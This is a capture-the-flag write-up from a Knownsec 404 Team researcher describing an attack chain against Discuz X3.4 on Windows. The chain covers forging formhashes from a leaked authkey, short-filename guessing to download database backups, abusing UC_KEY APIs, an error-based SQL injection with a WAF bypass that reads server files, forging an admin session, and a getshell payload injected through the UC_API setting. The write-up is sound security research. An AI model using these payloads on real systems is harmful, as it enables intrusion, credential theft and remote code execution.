**Author：LoRexxar@Knownsec 404 Team  
Time: May 11, 2020  
Chinese version: <https://paper.seebug.org/1197/>**

I took a look at the third Web Open of the null pointer this weekend, and
after a little research, I found that this is the latest version of the DZ3.4
environment with almost default configuration. We need to pwn it in such a DZ
under almost real environment. This moment raised my interest, and then we
will sort out the penetration process together.

The difference from the default environment is that we have two additional
conditions. 1\. The backend of the web environment is Windows; 2\. We get a
config file which contains an insecure configuration(and authkey)

After getting these two conditions, we started the penetration.

The following may be mentioned repeatedly DZ vulnerability written by the
author.

  * [这是一篇“不一样”的真实渗透测试案例分析文章](https://paper.seebug.org/1144/)

# What is the use of authkey

    
    
    / -------------------------  CONFIG SECURITY  -------------------------- //
    $_config['security']['authkey'] = '87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E';

authkey is the most important master key in the DZ security system. In the DZ
Website, the key related is basically constructed with the authkey and saltkey
which encrypt in the cookie.

After we have this authkey, we can calculate the formhash related to various
operations of the DZ (all POST-related operations of DZ need to calculate the
formhash)

With authkey, we can cooperate with the function in `source / include / misc /
misc_emailcheck.php` to modify the email for any user, but the administrator
cannot use the API to change the password.

You can use the following script to calculate the formhash

    
    
    $username = "ddog";
    $uid = 51;
    $saltkey = "SuPq5mmP";
    $config_authkey = "87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E";
    $authkey = md5($config_authkey.$saltkey);
    $formhash = substr(md5(substr($t, 0, -7).$username.$uid.$authkey."".""), 8, 8);

When we found that authkey alone could not penetrate further, we turned our
goal back to hint.

  1. The backend of the web environment is Windows
  2. **dz has normal backup data, and there is an important key value in the backup data**

# Windows short file name security issue

In August 2019, dz had such a problem.

  * [windows短文件名安全问题 数据库备份爆破](https://gitee.com/ComsenzDiscuz/DiscuzX/issues/I10NG9)

In the windows environment, there are many special methods for displaying file
names related to wildcard types, among which are not only `<>"`This type of
symbol can be used as a wildcard, and there is an ellipsis similar to`~`. This
problem is because the server, so cms cannot be repaired, so this has become a
long-term problem .

For specific details, please refer to the following article:

  * [Windows下的"你画我猜" -- 告别效率低下的目录扫描方法](https://18.163.237.232xz.aliyun.com/t/2318#toc-6)

With these two articles, we can directly read the backup file of the database.

This backup file exists in

    
    
    /data/backup_xxxxxx/200509_xxxxxx-1.sql

We can use

    
    
    http://xxxxx/data/backup~1/200507~2.sql

From the database file, we can find `UC_KEY (dz)` Find `UC_KEY (dz)` in the
authkey field of `pre_ucenter_applications`

So far we have got two pieces of information:

    
    
    uckey
    
    x9L1efE1ff17a4O7i158xcSbUfo1U2V7Lebef3g974YdG4w0E2LfI4s5R1p2t4m5
    
    authkey
    
    87042ce12d71b427eec3db2262db3765fQvehoxXi4yfNnjK5E

When we have these two keys, we can directly call any api in uc.php. The
further use of the latter is also based on this.

# Uc.php api use

Here we focus on the `/api/uc.php`.

![](https://images.seebug.org/content/images/2020/05/8f0a89ae-3e15-4e3e-9e1d-f818d03ffe11.png-w331s)

Calculate the code through `UC_KEY`, and then calculate the formhash
through`authkey`, we can call any function under the api, and there are
several more important operations under this api.

Let's focus on `updateapps` first. The special feature of this function is
that DZ directly replaces`UC_API` with `preg_replace`, which can lead to
getshell in the background.

Specific detailed analysis can be seen, this vulnerability originally came
from @dawu, I mentioned this background getshell in my CSS speech:

  * <https://paper.seebug.org/1144/#getwebshell>
  * <https://lorexxar.cn/2020/01/14/css-mysql-chain/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB-with-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2>

According to the operation here, we can construct `$ code = 'time ='. Time ().
'& Action = updateapps';`

To trigger updateapps, you can modify the `UC_API` in the configuration, but
in a previous version update, conditions were added here.

    
    
    if($post['UC_API']) {
        $UC_API = str_replace(array('\'', '"', '\\', "\0", "\n", "\r"), '', $post['UC_API']);
        unset($post['UC_API']);
    }

Due to the filtering of single quotes, the uc api we injected cannot close the
quotes, so we can’t complete the getshell with the api alone.

In other words, we must login to the background and use the background
modification function to cooperate with getshell. So far, our goal of
penetration has changed to how to login into the background.

# How to login into the DZ background

First of all, we must understand that DZ's front-end and back-end account
systems are separate. There are many functions including uc api, can only
login to the front-end account.

In other words, the only way to enter the background of DZ is to know the
background password of DZ, and this password cannot be changed by forget the
password at the front desk, so we need to find a way to change the password.

There are two main methods here, which also correspond to two attack ideas:
1\. Attack chain with error SQL injection 2\. Use the database backup to
restore and change the password

## 1\. Attack chain with error SQL injection

Continue to study uc.php, I found an injection point in function renameuser.

    
    
    function renameuser($get, $post) {
            global $_G;
    
            if(!API_RENAMEUSER) {
                return API_RETURN_FORBIDDEN;
            }
    
    
    
            $tables = array(
                'common_block' => array('id' => 'uid', 'name' => 'username'),
                'common_invite' => array('id' => 'fuid', 'name' => 'fusername'),
                'common_member_verify_info' => array('id' => 'uid', 'name' => 'username'),
                'common_mytask' => array('id' => 'uid', 'name' => 'username'),
                'common_report' => array('id' => 'uid', 'name' => 'username'),
    
                'forum_thread' => array('id' => 'authorid', 'name' => 'author'),
                'forum_activityapply' => array('id' => 'uid', 'name' => 'username'),
                'forum_groupuser' => array('id' => 'uid', 'name' => 'username'),
                'forum_pollvoter' => array('id' => 'uid', 'name' => 'username'),
                'forum_post' => array('id' => 'authorid', 'name' => 'author'),
                'forum_postcomment' => array('id' => 'authorid', 'name' => 'author'),
                'forum_ratelog' => array('id' => 'uid', 'name' => 'username'),
    
                'home_album' => array('id' => 'uid', 'name' => 'username'),
                'home_blog' => array('id' => 'uid', 'name' => 'username'),
                'home_clickuser' => array('id' => 'uid', 'name' => 'username'),
                'home_docomment' => array('id' => 'uid', 'name' => 'username'),
                'home_doing' => array('id' => 'uid', 'name' => 'username'),
                'home_feed' => array('id' => 'uid', 'name' => 'username'),
                'home_feed_app' => array('id' => 'uid', 'name' => 'username'),
                'home_friend' => array('id' => 'fuid', 'name' => 'fusername'),
                'home_friend_request' => array('id' => 'fuid', 'name' => 'fusername'),
                'home_notification' => array('id' => 'authorid', 'name' => 'author'),
                'home_pic' => array('id' => 'uid', 'name' => 'username'),
                'home_poke' => array('id' => 'fromuid', 'name' => 'fromusername'),
                'home_share' => array('id' => 'uid', 'name' => 'username'),
                'home_show' => array('id' => 'uid', 'name' => 'username'),
                'home_specialuser' => array('id' => 'uid', 'name' => 'username'),
                'home_visitor' => array('id' => 'vuid', 'name' => 'vusername'),
    
                'portal_article_title' => array('id' => 'uid', 'name' => 'username'),
                'portal_comment' => array('id' => 'uid', 'name' => 'username'),
                'portal_topic' => array('id' => 'uid', 'name' => 'username'),
                'portal_topic_pic' => array('id' => 'uid', 'name' => 'username'),
            );
    
            if(!C::t('common_member')->update($get['uid'], array('username' => $get[newusername])) && isset($_G['setting']['membersplit'])){
                C::t('common_member_archive')->update($get['uid'], array('username' => $get[newusername]));
            }
    
            loadcache("posttableids");
            if($_G['cache']['posttableids']) {
                foreach($_G['cache']['posttableids'] AS $tableid) {
                    $tables[getposttable($tableid)] = array('id' => 'authorid', 'name' => 'author');
                }
            }
    
            foreach($tables as $table => $conf) {
                DB::query("UPDATE ".DB::table($table)." SET `$conf[name]`='$get[newusername]' WHERE `$conf[id]`='$get[uid]'");
            }
            return API_RETURN_SUCCEED;
        }

At the bottom of the function, `$get[newusername]` is directly spliced into
the update statement.

But unfortunately, the linked database uses mysqli by default, and does not
support stack injection, so we can't directly execute the update statement
here to update the password. Here we can only construct an error injection to
obtain data.

    
    
    $code = 'time='.time().'&action=renameuser&uid=1&newusername=ddog\',name=(\'a\' or updatexml(1,concat(0x7e,(/*!00000select*/ substr(password,0) from pre_ucenter_members where uid = 1 limit 1)),0)),title=\'a';

It is worth noting here that the injection waf that comes with DZ is quite
strict, the core logic is in.

    
    
    \source\class\discuz\discuz_database.php line 375
    
    if (strpos($sql, '/') === false && strpos($sql, '#') === false && strpos($sql, '-- ') === false && strpos($sql, '@') === false && strpos($sql, '`') === false && strpos($sql, '"') === false) {
                $clean = preg_replace("/'(.+?)'/s", '', $sql);
            } else {
                $len = strlen($sql);
                $mark = $clean = '';
                for ($i = 0; $i < $len; $i++) {
                    $str = $sql[$i];
                    switch ($str) {
                        case '`':
                            if(!$mark) {
                                $mark = '`';
                                $clean .= $str;
                            } elseif ($mark == '`') {
                                $mark = '';
                            }
                            break;
                        case '\'':
                            if (!$mark) {
                                $mark = '\'';
                                $clean .= $str;
                            } elseif ($mark == '\'') {
                                $mark = '';
                            }
                            break;
                        case '/':
                            if (empty($mark) && $sql[$i + 1] == '*') {
                                $mark = '/*';
                                $clean .= $mark;
                                $i++;
                            } elseif ($mark == '/*' && $sql[$i - 1] == '*') {
                                $mark = '';
                                $clean .= '*';
                            }
                            break;
                        case '#':
                            if (empty($mark)) {
                                $mark = $str;
                                $clean .= $str;
                            }
                            break;
                        case "\n":
                            if ($mark == '#' || $mark == '--') {
                                $mark = '';
                            }
                            break;
                        case '-':
                            if (empty($mark) && substr($sql, $i, 3) == '-- ') {
                                $mark = '-- ';
                                $clean .= $mark;
                            }
                            break;
    
                        default:
    
                            break;
                    }
                    $clean .= $mark ? '' : $str;
                }
            }
    
            if(strpos($clean, '@') !== false) {
                return '-3';
            }
    
            $clean = preg_replace("/[^a-z0-9_\-\(\)#\*\/\"]+/is", "", strtolower($clean));
    
            if (self::$config['afullnote']) {
                $clean = str_replace('/**/', '', $clean);
            }
    
    
            if (is_array(self::$config['dfunction'])) {
                foreach (self::$config['dfunction'] as $fun) {
                    if (strpos($clean, $fun . '(') !== false)
                        return '-1';
                }
            }
    
            if (is_array(self::$config['daction'])) {
                foreach (self::$config['daction'] as $action) {
                    if (strpos($clean, $action) !== false)
                        return '-3';
                }
            }       
    
            if (self::$config['dlikehex'] && strpos($clean, 'like0x')) {
                return '-2';
            }
    
            if (is_array(self::$config['dnote'])) {
                foreach (self::$config['dnote'] as $note) {
                    if (strpos($clean, $note) !== false)
                        return '-4';
                }
            }

and the configure in:

    
    
    $_config['security']['querysafe']['dfunction']['0'] = 'load_file';
    $_config['security']['querysafe']['dfunction']['1'] = 'hex';
    $_config['security']['querysafe']['dfunction']['2'] = 'substring';
    $_config['security']['querysafe']['dfunction']['3'] = 'if';
    $_config['security']['querysafe']['dfunction']['4'] = 'ord';
    $_config['security']['querysafe']['dfunction']['5'] = 'char';
    $_config['security']['querysafe']['daction']['0'] = '@';
    $_config['security']['querysafe']['daction']['1'] = 'intooutfile';
    $_config['security']['querysafe']['daction']['2'] = 'intodumpfile';
    $_config['security']['querysafe']['daction']['3'] = 'unionselect';
    $_config['security']['querysafe']['daction']['4'] = '(select';
    $_config['security']['querysafe']['daction']['5'] = 'unionall';
    $_config['security']['querysafe']['daction']['6'] = 'uniondistinct';
    $_config['security']['querysafe']['dnote']['0'] = '/*';
    $_config['security']['querysafe']['dnote']['1'] = '*/';
    $_config['security']['querysafe']['dnote']['2'] = '#';
    $_config['security']['querysafe']['dnote']['3'] = '--';
    $_config['security']['querysafe']['dnote']['4'] = '"';

It open the `afullnote` in this challenge.

    
    
        if (self::$config['afullnote']) {
            $clean = str_replace('/**/', '', $clean);
        }

Since `/**/` is replaced with empty, we can directly add select to the middle,
and then replaced with empty, we can bypass the waf here.

When we got an error injection, we tried to read the file content and found
that because mysql is `5.5.29`, we can directly read any file on the server.

    
    
    $code = 'time='.time().'&action=renameuser&uid=1&newusername=ddog\',name=(\'a\' or updatexml(1,concat(0x7e,(/*!00000select*/ /*!00000load_file*/(\'c:/windows/win.ini\') limit 1)),0)),title=\'a';

When the idea came here, there was a fault, because we couldn't know where the
web path was, so we couldn't read the web file directly. Here I was deadlocked
for a long time, and finally the password was weak after the first person made
the question. I went straight into the background.

In the process of backtracking, I found that there is still a way. Although
the path of the web is very flexible for windows, in fact, for integrated
environments, it is generally installed under the c drive, and most people
will not move. The server path. Common windows integrated environment mainly
includes phpstudy and wamp, these two paths are respectively

    
    
    - /wamp64/www/
    - /phpstudy_pro/WWW/

After finding the corresponding path, we can read
`\uc_server\data\config.inc.php` to get`UC_KEY` of uc server.

After that we can directly call the one defined in `/uc_server/api/dpbak.php`

    
    
        function sid_encode($username) {
            $ip = $this->onlineip;
            $agent = $_SERVER['HTTP_USER_AGENT'];
            $authkey = md5($ip.$agent.UC_KEY);
            $check = substr(md5($ip.$agent), 0, 8);
            return rawurlencode($this->authcode("$username\t$check", 'ENCODE', $authkey, 1800));
        }
    
        function sid_decode($sid) {
            $ip = $this->onlineip;
            $agent = $_SERVER['HTTP_USER_AGENT'];
            $authkey = md5($ip.$agent.UC_KEY);
            $s = $this->authcode(rawurldecode($sid), 'DECODE', $authkey, 1800);
            if(empty($s)) {
                return FALSE;
            }
            @list($username, $check) = explode("\t", $s);
            if($check == substr(md5($ip.$agent), 0, 8)) {
                return $username;
            } else {
                return FALSE;
            }
        }

Construct the administrator's sid to bypass the authorization verification, in
this way we can modify the password and login to the background.

## 2\. Use the database backup to restore and change the password

In fact, when the last attack method followed the UC server's `UC_KEY`, it is
not difficult to find that there are many operations about database backup and
recovery in`/uc_server/api/dbbak.php`, which is also my previous Not found.

In fact, there is exactly the same code and function in `/api/dbbak.php`, and
that api only needs DZ ’s`UC_KEY` to operate, we can find a place to upload at
the front desk, and then call backup to restore and overwrite the database ,
So that the administrator's password can be changed.

# Getshell in backend

After logging in, it is relatively simple, first

![](https://images.seebug.org/content/images/2020/05/5c185414-c509-4e79-9bda-042f8c7a7b5b.png-w331s)

modify the uc api to

    
    
    http://127.0.0.1/uc_server');phpinfo();//

then, use api to update uc api

![](https://images.seebug.org/content/images/2020/05/f8a515d7-f528-4daf-bcea-11dc7db61b08.png-w331s)

Here return 11 means success

![](https://images.seebug.org/content/images/2020/05/0de296cc-556f-4650-9024-732b3e387226.png-w331s)

# Finally

The whole question mainly surrounds the core key security system of DZ. In
fact, except for the Windows environment, there are almost no other special
conditions. In addition, the short file name problem is mainly on the server
side. We can easily find the backup file. After finding the backup file, we
can obtain the most important authkey and uc key directly from the database,
and the subsequent infiltration process is logical.

From this article, you can also get a glimpse of the ways in which you can use
it in different situations, and you can get more ideas with the original text.

# REF

  * <https://paper.seebug.org/1144/>
  * <https://lorexxar.cn/2020/01/14/css-mysql-chain/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB-with-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2>
  * <https://lorexxar.cn/2017/08/31/dz-authkey/>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1205/>

